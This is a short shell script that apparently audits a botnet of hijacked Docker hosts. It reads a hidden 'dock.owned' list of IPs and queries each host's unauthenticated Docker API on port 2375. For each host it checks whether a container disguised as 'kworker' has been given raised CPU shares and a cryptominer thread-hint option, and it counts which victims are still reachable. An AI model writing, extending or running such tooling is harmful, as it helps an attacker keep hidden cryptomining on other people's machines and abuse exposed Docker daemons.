#!/bin/sh
# How far has the CpuShares-2048 / thread-hint rollout gone across hosts we own?
# Run on the box (CR stripped):  tr -d '\r' < _ver2.sh > /tmp/v2.sh; sh /tmp/v2.sh
W=/tmp/.sysd/.hunt
exec > /tmp/_ver2.out 2>&1
tot=0; cpu2048=0; hint=0; ours=0; gone=0; pinfo=0
while read -r ip; do
    [ -n "$ip" ] || continue
    tot=$((tot + 1))
    j=$(curl -fsS -m 6 "http://$ip:2375/containers/kworker/json" 2>/dev/null) || j=""
    if [ -z "$j" ]; then gone=$((gone + 1)); echo "$ip GONE"; continue; fi
    ours=$((ours + 1))
    cs=$(printf '%s' "$j" | grep -o '"CpuShares":[0-9]*' | head -1 | cut -d: -f2)
    [ "$cs" = "2048" ] && cpu2048=$((cpu2048 + 1))
    h=0
    if printf '%s' "$j" | grep -q cpu-max-threads-hint; then h=1; hint=$((hint + 1)); fi
    nc=$(curl -fsS -m 5 "http://$ip:2375/info" 2>/dev/null | grep -o '"NCPU":[0-9]*' | head -1 | cut -d: -f2)
    [ -n "$nc" ] && pinfo=$((pinfo + 1))
    echo "$ip cpu=${cs:-?} hint=$h ncpu=${nc:-?}"
done < "$W/dock.owned"
echo "TOTAL=$tot reached=$ours gone=$gone cpu2048=$cpu2048 with_hint=$hint info_ok=$pinfo"
